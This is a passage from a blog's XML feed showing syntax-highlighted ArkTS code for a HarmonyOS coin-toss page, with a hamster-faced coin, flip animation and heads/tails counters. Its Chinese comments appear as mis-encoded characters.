¼å®½åº¦</span></span><br><span class="line"> </span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Stack</span>() &#123; <span class="comment">// åˆ›å»ºä¸€ä¸ªå †å å¸ƒå±€</span></span><br><span class="line">      <span class="comment">// èº«ä½“</span></span><br><span class="line">      <span class="title class_">Text</span>()</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">2</span>&#125;</span>lpx`</span>)<span class="comment">// å®½åº¦ä¸ºå•å…ƒæ ¼å®½åº¦çš„ä¸€åŠ</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">3</span> * <span class="number">2</span>&#125;</span>lpx`</span>)<span class="comment">// é«˜åº¦ä¸ºå•å…ƒæ ¼é«˜åº¦çš„2/3</span></span><br><span class="line">        .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#b49579&quot;</span>)<span class="comment">// èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">        .<span class="title function_">borderRadius</span>(&#123; <span class="attr">topLeft</span>: <span class="string">&#x27;50%&#x27;</span>, <span class="attr">topRight</span>: <span class="string">&#x27;50%&#x27;</span> &#125;)<span class="comment">// åœ†è§’</span></span><br><span class="line">        .<span class="title function_">borderColor</span>(<span class="string">&quot;#2a272d&quot;</span>)<span class="comment">// è¾¹æ¡†é¢œè‰²</span></span><br><span class="line">        .<span class="title function_">borderWidth</span>(<span class="number">1</span>) <span class="comment">// è¾¹æ¡†å®½åº¦</span></span><br><span class="line">      <span class="comment">// å˜´å·´</span></span><br><span class="line">      <span class="title class_">Ellipse</span>()</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">4</span>&#125;</span>lpx`</span>)<span class="comment">// å˜´å·´çš„å®½åº¦</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">5</span>&#125;</span>lpx`</span>)<span class="comment">// å˜´å·´çš„é«˜åº¦</span></span><br><span class="line">        .<span class="title function_">fillOpacity</span>(<span class="number">1</span>)<span class="comment">// å¡«å……ä¸é€æ˜åº¦</span></span><br><span class="line">        .<span class="title function_">fill</span>(<span class="string">&quot;#e7bad7&quot;</span>)<span class="comment">// å¡«å……é¢œè‰²</span></span><br><span class="line">        .<span class="title function_">stroke</span>(<span class="string">&quot;#563e3f&quot;</span>)<span class="comment">// è¾¹æ¡†é¢œè‰²</span></span><br><span class="line">        .<span class="title function_">strokeWidth</span>(<span class="number">1</span>)<span class="comment">// è¾¹æ¡†å®½åº¦</span></span><br><span class="line">        .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">6</span>&#125;</span>lpx`</span> &#125;) <span class="comment">// ä¸Šè¾¹è·</span></span><br><span class="line">      <span class="comment">// å·¦çœ¼ç›</span></span><br><span class="line">      <span class="title class_">Ellipse</span>()</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">9</span>&#125;</span>lpx`</span>)<span class="comment">// å·¦çœ¼ç›çš„å®½åº¦</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">6</span>&#125;</span>lpx`</span>)<span class="comment">// å·¦çœ¼ç›çš„é«˜åº¦</span></span><br><span class="line">        .<span class="title function_">fillOpacity</span>(<span class="number">1</span>)<span class="comment">// å¡«å……ä¸é€æ˜åº¦</span></span><br><span class="line">        .<span class="title function_">fill</span>(<span class="string">&quot;#313028&quot;</span>)<span class="comment">// å¡«å……é¢œè‰²</span></span><br><span class="line">        .<span class="title function_">stroke</span>(<span class="string">&quot;#2e2018&quot;</span>)<span class="comment">// è¾¹æ¡†é¢œè‰²</span></span><br><span class="line">        .<span class="title function_">strokeWidth</span>(<span class="number">1</span>)<span class="comment">// è¾¹æ¡†å®½åº¦</span></span><br><span class="line">        .<span class="title function_">margin</span>(&#123; <span class="attr">bottom</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">3</span>&#125;</span>lpx`</span>, <span class="attr">right</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">6</span>&#125;</span>lpx`</span> &#125;) <span class="comment">// ä¸‹è¾¹è·å’Œå³è¾¹è·</span></span><br><span class="line">      <span class="comment">// å³çœ¼ç›</span></span><br><span class="line">      <span class="title class_">Ellipse</span>()</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">9</span>&#125;</span>lpx`</span>)<span class="comment">// å³çœ¼ç›çš„å®½åº¦</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">6</span>&#125;</span>lpx`</span>)<span class="comment">// å³çœ¼ç›çš„é«˜åº¦</span></span><br><span class="line">        .<span class="title function_">fillOpacity</span>(<span class="number">1</span>)<span class="comment">// å¡«å……ä¸é€æ˜åº¦</span></span><br><span class="line">        .<span class="title function_">fill</span>(<span class="string">&quot;#313028&quot;</span>)<span class="comment">// å¡«å……é¢œè‰²</span></span><br><span class="line">        .<span class="title function_">stroke</span>(<span class="string">&quot;#2e2018&quot;</span>)<span class="comment">// è¾¹æ¡†é¢œè‰²</span></span><br><span class="line">        .<span class="title function_">strokeWidth</span>(<span class="number">1</span>)<span class="comment">// è¾¹æ¡†å®½åº¦</span></span><br><span class="line">        .<span class="title function_">margin</span>(&#123; <span class="attr">bottom</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">3</span>&#125;</span>lpx`</span>, <span class="attr">left</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">6</span>&#125;</span>lpx`</span> &#125;) <span class="comment">// ä¸‹è¾¹è·å’Œå·¦è¾¹è·</span></span><br><span class="line">      <span class="comment">// å·¦çœ¼ç³</span></span><br><span class="line">      <span class="title class_">Ellipse</span>()</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">20</span>&#125;</span>lpx`</span>)<span class="comment">// å·¦çœ¼ç³çš„å®½åº¦</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">15</span>&#125;</span>lpx`</span>)<span class="comment">// å·¦çœ¼ç³çš„é«˜åº¦</span></span><br><span class="line">        .<span class="title function_">fillOpacity</span>(<span class="number">1</span>)<span class="comment">// å¡«å……ä¸é€æ˜åº¦</span></span><br><span class="line">        .<span class="title function_">fill</span>(<span class="string">&quot;#fefbfa&quot;</span>)<span class="comment">// å¡«å……é¢œè‰²</span></span><br><span class="line">        .<span class="title function_">margin</span>(&#123; <span class="attr">bottom</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">2.5</span>&#125;</span>lpx`</span>, <span class="attr">right</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">6</span>&#125;</span>lpx`</span> &#125;) <span class="comment">// ä¸‹è¾¹è·å’Œå³è¾¹è·</span></span><br><span class="line">      <span class="comment">// å³çœ¼ç³</span></span><br><span class="line">      <span class="title class_">Ellipse</span>()</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">20</span>&#125;</span>lpx`</span>)<span class="comment">// å³çœ¼ç³çš„å®½åº¦</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">15</span>&#125;</span>lpx`</span>)<span class="comment">// å³çœ¼ç³çš„é«˜åº¦</span></span><br><span class="line">        .<span class="title function_">fillOpacity</span>(<span class="number">1</span>)<span class="comment">// å¡«å……ä¸é€æ˜åº¦</span></span><br><span class="line">        .<span class="title function_">fill</span>(<span class="string">&quot;#fefbfa&quot;</span>)<span class="comment">// å¡«å……é¢œè‰²</span></span><br><span class="line">        .<span class="title function_">margin</span>(&#123; <span class="attr">bottom</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">2.5</span>&#125;</span>lpx`</span>, <span class="attr">left</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">6</span>&#125;</span>lpx`</span> &#125;) <span class="comment">// ä¸‹è¾¹è·å’Œå·¦è¾¹è·</span></span><br><span class="line">    &#125;.<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>).<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®ç»„ä»¶çš„å®½åº¦å’Œé«˜åº¦</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// å®šä¹‰é¡µé¢ç»„ä»¶</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">CoinTossPage</span> &#123;</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cellWidth</span>: number = <span class="number">50</span> <span class="comment">// å•å…ƒæ ¼å®½åº¦</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">headsCount</span>: number = <span class="number">0</span> <span class="comment">// æ­£é¢æœä¸Šçš„æ¬¡æ•°</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">tailsCount</span>: number = <span class="number">0</span> <span class="comment">// åé¢æœä¸Šçš„æ¬¡æ•°</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">rotationAngle</span>: number = <span class="number">0</span> <span class="comment">// æ—‹è½¬è§’åº¦</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">verticalOffset</span>: number = <span class="number">0</span> <span class="comment">// çºµå‘ä½ç§»</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">isAnimRun</span>: boolean = <span class="literal">false</span> <span class="comment">// åŠ¨ç”»æ˜¯å¦æ­£åœ¨æ‰§è¡Œ</span></span><br><span class="line"> </span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>() &#123;</span><br><span class="line">      <span class="comment">// é¡µé¢æ ‡é¢˜</span></span><br><span class="line">      <span class="title class_">Text</span>(<span class="string">&#x27;æŠ›ç¡¬å¸&#x27;</span>)</span><br><span class="line">        .<span class="title function_">height</span>(<span class="number">50</span>)<span class="comment">// é«˜åº¦è®¾ç½®ä¸º50</span></span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)<span class="comment">// å®½åº¦è®¾ç½®ä¸º100%</span></span><br><span class="line">        .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)<span class="comment">// æ–‡æœ¬å±…ä¸­å¯¹é½</span></span><br><span class="line">        .<span class="title function_">fontColor</span>(<span class="string">&quot;#fefefe&quot;</span>)<span class="comment">// å­—ä½“é¢œè‰²</span></span><br><span class="line">        .<span class="title function_">fontSize</span>(<span class="number">20</span>); <span class="comment">// å­—ä½“å¤§å°</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">// æ˜¾ç¤ºåœ°é¼ å’Œè®¡æ•°</span></span><br><span class="line">      <span class="title class_">Row</span>(&#123; <span class="attr">space</span>: <span class="number">20</span> &#125;) &#123;</span><br><span class="line">        <span class="title class_">Stack</span>() &#123;</span><br><span class="line">          <span class="title class_">Hamster</span>(&#123; <span class="attr">cellWidth</span>: <span class="variable language_">this</span>.<span class="property">cellWidth</span> &#125;) <span class="comment">// åˆ›å»ºåœ°é¼ ç»„ä»¶</span></span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>) <span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">        .<span class="title function_">linearGradient</span>(&#123;</span><br><span class="line">          <span class="comment">// è®¾ç½®çº¿æ€§æ¸å˜èƒŒæ™¯</span></span><br><span class="line">          <span class="attr">direction</span>: <span class="title class_">GradientDirection</span>.<span class="property">LeftBottom</span>,</span><br><span class="line">          <span class="attr">colors</span>: [[<span class="string">&#x27;#ebcf2f&#x27;</span>, <span class="number">0.0</span>], [<span class="string">&#x27;#fef888&#x27;</span>, <span class="number">0.5</span>], [<span class="string">&#x27;#ebcf2f&#x27;</span>, <span class="number">1.0</span>]]</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// æ˜¾ç¤ºåé¢æœä¸Šçš„æ¬¡æ•°</span></span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.tailsCount&#125;</span>`</span>)</span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="number">20</span>)</span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="string">&quot;#fefefe&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="title class_">Stack</span>() &#123;</span><br><span class="line">          <span class="comment">// æ˜¾ç¤º100</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&quot;100&quot;</span>)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="string">&quot;#9f7606&quot;</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">2</span>&#125;</span>lpx`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>) <span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">        .<span class="title function_">linearGradient</span>(&#123;</span><br><span class="line">          <span class="comment">// è®¾ç½®çº¿æ€§æ¸å˜èƒŒæ™¯</span></span><br><span class="line">          <span class="attr">direction</span>: <span class="title class_">GradientDirection</span>.<span class="property">LeftBottom</span>,</span><br><span class="line">          <span class="attr">colors</span>: [[<span class="string">&#x27;#ebcf2f&#x27;</span>, <span class="number">0.0</span>], [<span class="string">&#x27;#fef888&#x27;</span>, <span class="number">0.5</span>], [<span class="string">&#x27;#ebcf2f&#x27;</span>, <span class="number">1.0</span>]]</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// æ˜¾ç¤ºæ­£é¢æœä¸Šçš„æ¬¡æ•°</span></span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.headsCount&#125;</span>`</span>)</span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="number">20</span>)</span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="string">&quot;#fefefe&quot;</span>);</span><br><span class="line"> </span><br><span class="line">      &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">Center</span>); <span class="comment">// è®¾ç½®å®½åº¦å’Œå†…å®¹å±…ä¸­å¯¹é½</span></span><br><span class="line"> </span><br><span class="line">      <span class="title class_">Stack</span>() &#123;</span><br><span class="line">        <span class="title class_">Stack</span>() &#123;</span><br><span class="line">          <span class="comment">// åˆ›å»ºæ”¾å¤§ç‰ˆåœ°é¼ ç»„ä»¶</span></span><br><span class="line">          <span class="title class_">Hamster</span>(&#123; <span class="attr">cellWidth</span>: <span class="variable language_">this</span>.<span class="property">cellWidth</span> * <span class="number">3</span> &#125;)</span><br><span class="line">            .<span class="title function_">visibility</span>(<span class="variable language_">this</span>.<span class="title function_">isHeadsFaceUp</span>() ? <span class="title class_">Visibility</span>.<span class="property">Visible</span> : <span class="title class_">Visibility</span>.<span class="property">Hidden</span>); <span class="comment">// æ ¹æ®çŠ¶æ€æ˜¾ç¤ºæˆ–éšè—</span></span><br><span class="line"> </span><br><span class="line">          <span class="comment">// æ˜¾ç¤º100</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&quot;100&quot;</span>)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="string">&quot;#9f7606&quot;</span>)<span class="comment">// å­—ä½“é¢œè‰²</span></span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">2</span> * <span class="number">3</span>&#125;</span>lpx`</span>)<span class="comment">// å­—ä½“å¤§å°</span></span><br><span class="line">            .<span class="title function_">visibility</span>(!<span class="variable language_">this</span>.<span class="title function_">isHeadsFaceUp</span>() ? <span class="title class_">Visibility</span>.<span class="property">Visible</span> : <span class="title class_">Visibility</span>.<span class="property">Hidden</span>)<span class="comment">// æ ¹æ®çŠ¶æ€æ˜¾ç¤ºæˆ–éšè—</span></span><br><span class="line">            .<span class="title function_">rotate</span>(&#123;</span><br><span class="line">              <span class="comment">// æ—‹è½¬180åº¦</span></span><br><span class="line">              <span class="attr">x</span>: <span class="number">1</span>,</span><br><span class="line">              <span class="attr">y</span>: <span class="number">0</span>,</span><br><span class="line">              <span class="attr">z</span>: <span class="number">0</span>,</span><br><span class="line">              <span class="attr">angle</span>: <span class="number">180</span></span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>) <span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth * <span class="number">3</span>&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth * <span class="number">3</span>&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">        .<span class="title function_">linearGradient</span>(&#123;</span><br><span class="line">          <span class="comment">// è®¾ç½®çº¿æ€§æ¸å˜èƒŒæ™¯</span></span><br><span class="line">          <span class="attr">direction</span>: <span class="title class_">GradientDirection</span>.<span class="property">LeftBottom</span>,</span><br><span class="line">          <span class="attr">colors</span>: [[<span class="string">&#x27;#ebcf2f&#x27;</span>, <span class="number">0.0</span>], [<span class="string">&#x27;#fef888&#x27;</span>, <span class="number">0.5</span>], [<span class="string">&#x27;#ebcf2f&#x27;</span>, <span class="number">1.0</span>]]</span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">rotate</span>(&#123;</span><br><span class="line">          <span class="comment">// æ ¹æ®å½“å‰è§’åº¦æ—‹è½¬</span></span><br><span class="line">          <span class="attr">x</span>: <span class="number">1</span>,</span><br><span class="line">          <span class="attr">y</span>: <span class="number">0</span>,</span><br><span class="line">          <span class="attr">z</span>: <span class="number">0</span>,</span><br><span class="line">          <span class="attr">angle</span>: <span class="variable language_">this</span>.<span class="property">rotationAngle</span></span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">translate</span>(&#123; <span class="attr">x</span>: <span class="number">0</span>, <span class="attr">y</span>: <span class="variable language_">this</span>.<span class="property">verticalOffset</span> &#125;) <span class="comment">// è®¾ç½®çºµå‘ä½ç§»</span></span><br><span class="line">        .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// ç‚¹å‡»äº‹ä»¶å¤„ç†</span></span><br><span class="line"> </span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isAnimRun</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">isAnimRun</span> = <span class="literal">true</span></span><br><span class="line"> </span><br><span class="line">          <span class="keyword">let</span> maxAnimationSteps = <span class="number">2</span> * (<span class="number">10</span> + <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">10</span>)); <span class="comment">// è®¡ç®—æœ€å¤§åŠ¨ç”»æ¬¡æ•°</span></span><br><span class="line">          <span class="keyword">let</span> totalAnimationDuration = <span class="number">2000</span>; <span class="comment">// åŠ¨ç”»æ€»æ—¶é•¿</span></span><br><span class="line"> </span><br><span class="line">          <span class="comment">// ç¬¬ä¸€æ¬¡åŠ¨ç”»ï¼Œå‘ä¸ŠæŠ›å‡º</span></span><br><span class="line">          <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">            <span class="attr">duration</span>: totalAnimationDuration / <span class="number">2</span>, <span class="comment">// åŠ¨ç”»æ—¶é•¿ä¸ºæ€»æ—¶é•¿çš„ä¸€åŠ</span></span><br><span class="line">            <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// åŠ¨ç”»å®Œæˆåçš„å›è°ƒ</span></span><br><span class="line">              <span class="comment">// ç¬¬äºŒæ¬¡åŠ¨ç”»ï¼Œå‘ä¸‹è½</span></span><br><span class="line">              <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">                <span class="attr">duration</span>: totalAnimationDuration / <span class="number">2</span>,</span><br><span class="line">                <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                  <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="variable language_">this</span>.<span class="property">rotationAngle</span> % <span class="number">360</span>; <span class="comment">// ç¡®ä¿è§’åº¦åœ¨0åˆ°360ä¹‹é—´</span></span><br><span class="line">                  <span class="comment">// åˆ¤æ–­å½“å‰æ˜¾ç¤ºçš„é¢</span></span><br><span class="line">                  <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="title function_">isHeadsFaceUp</span>()) &#123; <span class="comment">// å¦‚æœæ˜¯åœ°é¼ é¢</span></span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">tailsCount</span>++; <span class="comment">// åé¢æœä¸Šçš„æ¬¡æ•°åŠ 1</span></span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123; <span class="comment">// å¦‚æœæ˜¯åé¢</span></span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">headsCount</span>++; <span class="comment">// æ­£é¢æœä¸Šçš„æ¬¡æ•°åŠ 1</span></span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="variable language_">this</span>.<span class="property">isAnimRun</span> = <span class="literal">false</span></span><br><span class="line">                &#125;</span><br><span class="line">              &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">verticalOffset</span> = <span class="number">0</span>; <span class="comment">// é‡ç½®çºµå‘ä½ç§»</span></span><br><span class="line">              &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// è®¾ç½®çºµå‘ä½ç§»ï¼Œæ¨¡æ‹ŸæŠ›ç¡¬å¸çš„æ•ˆæœ</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">verticalOffset</span> = -<span class="number">100</span> * (<span class="number">1</span> + <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">5</span>)); <span class="comment">// éšæœºè®¾ç½®å‘ä¸Šçš„ä½ç§»</span></span><br><span class="line">          &#125;);</span><br><span class="line"> </span><br><span class="line">          <span class="comment">// å¾ªç¯åŠ¨ç”»ï¼Œå¢åŠ æ—‹è½¬æ•ˆæœ</span></span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; maxAnimationSteps; i++) &#123;</span><br><span class="line">            <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">              <span class="attr">delay</span>: i * totalAnimationDuration / maxAnimationSteps, <span class="comment">// è®¾ç½®æ¯æ¬¡åŠ¨ç”»çš„å»¶è¿Ÿ</span></span><br><span class="line">              <span class="attr">duration</span>: <span class="number">100</span>, <span class="comment">// æ¯æ¬¡åŠ¨ç”»çš„æŒç»­æ—¶é—´</span></span><br><span class="line">              <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="comment">// åŠ¨ç”»å®Œæˆåçš„å›è°ƒ</span></span><br><span class="line">              &#125;</span><br><span class="line">            &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">rotationAngle</span> += <span class="number">90</span>; <span class="comment">// æ¯æ¬¡å¢åŠ 90åº¦æ—‹è½¬</span></span><br><span class="line">            &#125;);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">      &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">layoutWeight</span>(<span class="number">1</span>).<span class="title function_">align</span>(<span class="title class_">Alignment</span>.<span class="property">Bottom</span>).<span class="title function_">padding</span>(&#123; <span class="attr">bottom</span>: <span class="number">80</span> &#125;); <span class="comment">// è®¾ç½®ç»„ä»¶çš„å®½åº¦ã€æƒé‡ã€å¯¹é½æ–¹å¼å’Œåº•éƒ¨å†…è¾¹è·</span></span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®æ•´ä¸ªé¡µé¢çš„é«˜åº¦</span></span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®æ•´ä¸ªé¡µé¢çš„å®½åº¦</span></span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#0b0d0c&quot;</span>); <span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// åˆ¤æ–­å½“å‰æ˜¯å¦æ˜¾ç¤ºåœ°é¼ é¢</span></span><br><span class="line">  <span class="title function_">isHeadsFaceUp</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> normalizedAngle = <span class="variable language_">this</span>.<span class="property">rotationAngle</span> % <span class="number">360</span>; <span class="comment">// è§„èŒƒåŒ–è§’åº¦</span></span><br><span class="line">    <span class="comment">// åˆ¤æ–­è§’åº¦èŒƒå›´ï¼Œç¡®å®šæ˜¯å¦æ˜¾ç¤ºåœ°é¼ é¢</span></span><br><span class="line">    <span class="keyword">if</span> (normalizedAngle &gt;= <span class="number">0</span> &amp;&amp; normalizedAngle &lt; <span class="number">90</span> || normalizedAngle &gt;= <span class="number">270</span> &amp;&amp; normalizedAngle &lt;= <span class="number">360</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// æ˜¾ç¤ºåœ°é¼ é¢</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// æ˜¾ç¤ºåé¢</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><!--åˆ†è´ä»ªhttps://blog.csdn.net/zhongcongxu01/article/details/143460361https://blog.csdn.net/zhongcongxu01/article/details/142773929-->]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒ&quot;&gt;&lt;/a&gt;ç¯å¢ƒ&lt;/h1&gt;&lt;p&gt;DevEco Studio NEXT Beta1 Build Version: 5.0&lt;br&gt;API 13&lt;/p&gt;
&lt;h1 id=&quot;Wast</summary>
      
    
    
    
    <category term="æŠ€æœ¯" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="HarmonryOS" scheme="https://banjinmei.github.io/tags/HarmonryOS/"/>
    
  </entry>
  
  <entry>
    <title>é¸¿è’™åº”ç”¨-åŸºäºArkTSå¡ç‰‡å¼€å‘-HarmonyOSæœåŠ¡å¡ç‰‡</title>
    <link href="https://banjinmei.github.io/2024/12/13/%E9%B8%BF%E8%92%99%E5%BA%94%E7%94%A8-%E5%9F%BA%E4%BA%8EArkTS%E5%8D%A1%E7%89%87%E5%BC%80%E5%8F%91-HarmonyOS%E6%9C%8D%E5%8A%A1%E5%8D%A1%E7%89%87/"/>
